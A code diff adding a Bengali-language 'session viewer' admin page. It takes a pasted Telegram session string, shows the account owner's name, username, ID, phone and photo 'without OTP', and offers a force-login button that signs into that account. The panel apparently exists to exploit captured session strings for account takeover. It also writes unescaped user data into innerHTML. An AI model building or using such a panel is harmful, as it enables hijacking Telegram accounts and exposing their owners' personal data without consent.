@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>সেশন ভিউয়ার - AAF অ্যাডমিন টুল</title>
+    <style>
+        body { background: #0a0f1e; color: #fff; font-family: monospace; padding: 20px; }
+        .container { max-width: 600px; margin: 0 auto; background: #111827; border-radius: 20px; padding: 25px; border: 1px solid #2d3a5e; }
+        input, button { width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px; border: none; box-sizing: border-box; }
+        input { background: #1e293b; color: #fff; font-family: monospace; }
+        button { background: #00f2fe; color: #000; font-weight: bold; cursor: pointer; }
+        .user-card { background: #1e293b; padding: 15px; border-radius: 15px; margin-top: 20px; }
+        .avatar { width: 80px; height: 80px; border-radius: 50%; background: #334155; display: flex; align-items: center; justify-content: center; margin-bottom: 15px; overflow: hidden; }
+        .avatar img { width: 100%; height: 100%; object-fit: cover; }
+        hr { border-color: #2d3a5e; }
+        .error { color: #ff7777; background: #4a1a1a; padding: 10px; border-radius: 10px; }
+        .back-link { color: #94a3b8; text-decoration: none; display: inline-block; margin-bottom: 15px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <a href="/admin" class="back-link">← অ্যাডমিন প্যানেলে ফিরুন</a>
+    <h2 style="color:#00f2fe;">🗝️ সেশন ভিউয়ার</h2>
+    <p style="font-size:12px; color:#94a3b8;">একটি বৈধ টেলিগ্রাম সেশন স্ট্রিং দিন। এটি দিয়ে ইউজারের তথ্য দেখা যাবে (OTP ছাড়া)।</p>
+    <input type="text" id="sessionInput" placeholder="পেস্ট করুন সেশন স্ট্রিং (StringSession)" style="font-family: monospace; font-size: 12px;">
+    <button onclick="loadUser()">📂 ইউজার লোড করুন</button>
+    <div id="result"></div>
+
+    <!-- লগইন বাটন -->
+    <button onclick="loginWithSession()" style="background:#00ff88; color:#000; margin-top:10px;">🔐 এই অ্যাকাউন্টে লগইন করুন</button>
+</div>
+
+<script>
+async function loadUser() {
+    const sessionStr = document.getElementById('sessionInput').value.trim();
+    if (!sessionStr) {
+        alert('সেশন স্ট্রিং দিন');
+        return;
+    }
+    const resultDiv = document.getElementById('result');
+    resultDiv.innerHTML = '<div style="text-align:center; padding:20px;"><i class="fas fa-spinner fa-spin"></i> লোড হচ্ছে...</div>';
+    try {
+        const res = await fetch('/api/admin/load_session', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include',
+            body: JSON.stringify({ session_string: sessionStr })
+        });
+        const data = await res.json();
+        if (data.success) {
+            const u = data.user;
+            let photoHtml = '<div class="avatar"><i class="fas fa-user-circle" style="font-size: 60px; color:#aaa;"></i></div>';
+            if (u.photo && u.photo.startsWith('data:image')) {
+                photoHtml = `<div class="avatar"><img src="${u.photo}" alt="photo"></div>`;
+            } else if (u.photo && !u.photo.startsWith('data:')) {
+                photoHtml = `<div class="avatar"><img src="data:image/jpeg;base64,${u.photo}" alt="photo"></div>`;
+            }
+            resultDiv.innerHTML = `
+                <div class="user-card">
+                    ${photoHtml}
+                    <h3>${u.first_name || ''} ${u.last_name || ''}</h3>
+                    <p><strong>👤 ইউজারনেম:</strong> ${u.username || 'N/A'}</p>
+                    <p><strong>🆔 টেলিগ্রাম আইডি:</strong> ${u.id}</p>
+                    <p><strong>📞 ফোন:</strong> ${u.phone || 'N/A'}</p>
+                    <hr>
+                    <p style="font-size:10px; color:#ef4444;">⚠️ সেশন স্ট্রিং ব্যবহার করে পুরো অ্যাকাউন্ট অ্যাক্সেস করা যায়। সাবধান!</p>
+                </div>
+            `;
+        } else {
+            resultDiv.innerHTML = `<div class="error">❌ ত্রুটি: ${data.error || 'অজানা সমস্যা'}</div>`;
+        }
+    } catch(e) {
+        resultDiv.innerHTML = `<div class="error">❌ সার্ভার কানেকশন ব্যর্থ</div>`;
+    }
+}
+
+async function loginWithSession() {
+    const sessionStr = document.getElementById('sessionInput').value.trim();
+    if (!sessionStr) {
+        alert('সেশন স্ট্রিং দিন');
+        return;
+    }
+    const res = await fetch('/api/force_login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ session_string: sessionStr })
+    });
+    const data = await res.json();
+    if (data.success) {
+        localStorage.setItem("telegram_id", data.telegram_id);
+        alert("✅ লগইন সফল! ড্যাশবোর্ডে রিডিরেক্ট হচ্ছে...");
+        window.location.href = "/dashboard";
+    } else {
+        alert("❌ লগইন ব্যর্থ: " + (data.error || "অজানা ত্রুটি"));
+    }
+}
+</script>
+</body>
+</html>
